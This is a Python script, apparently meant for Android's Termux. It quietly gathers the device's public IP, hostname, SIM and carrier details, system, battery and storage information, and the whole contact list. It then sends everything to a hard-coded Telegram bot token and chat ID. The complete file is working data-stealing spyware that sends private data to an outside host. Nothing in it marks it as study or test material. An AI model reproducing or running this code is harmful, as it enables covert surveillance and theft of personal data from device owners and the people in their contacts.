import os
import requests
import socket
import json

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to gather contact list
def get_contact_list():
    try:
        contacts = os.popen('termux-contact-list').read().strip()
        contacts_json = json.loads(contacts)
        contact_numbers = []
        
        for contact in contacts_json:
            # Collect phone numbers
            if 'number' in contact:
                name = contact.get('name', 'Unknown').replace('_', '\\_')  # Escape special characters for Markdown
                number = contact['number'].replace('_', '\\_')
                contact_numbers.append(f"{name}: `{number}`")
        
        if contact_numbers:
            return "\n".join(contact_numbers)
        else:
            return "No contacts found."
    except Exception as e:
        return f"Error getting contact list: {str(e)}"

# Function to gather device info
def get_device_info():
    try:
        # Get IP address
        ip_address = requests.get('https://api.ipify.org').text
        
        # Get device hostname
        device_name = socket.gethostname().replace('_', '\\_')  # Escape special characters for Markdown
        
        # Get SIM info (Termux-specific command)
        sim_info = os.popen('termux-telephony-cellinfo').read().strip()

        # Get operator info (Termux-specific command)
        operator_info = os.popen('termux-telephony-deviceinfo').read().strip()

        # Get system info
        os_info = os.popen('uname -a').read().strip()

        # Get battery info
        battery_info = os.popen('termux-battery-status').read().strip()

        # Get storage info
        storage_info = os.popen('df -h /data').read().strip()

        # Get contacts info
        contact_info = get_contact_list()

        # Prepare message to send
        message = (
            f"*Device Info*\n"
            f"IP Address: `{ip_address}`\n"
            f"Device Name: `{device_name}`\n"
            f"SIM Info: `{sim_info}`\n"
            f"Operator Info: `{operator_info}`\n"
            f"OS Info: `{os_info}`\n"
            f"Battery Info: `{battery_info}`\n"
            f"Storage Info: `{storage_info}`\n\n"
            f"*Contacts List:*\n{contact_info}"
        )

        # Send the collected info to Telegram
        send_to_telegram(message)

    except Exception as e:
        print(f"Error getting device info: {str(e)}")

if __name__ == "__main__":
    get_device_info()
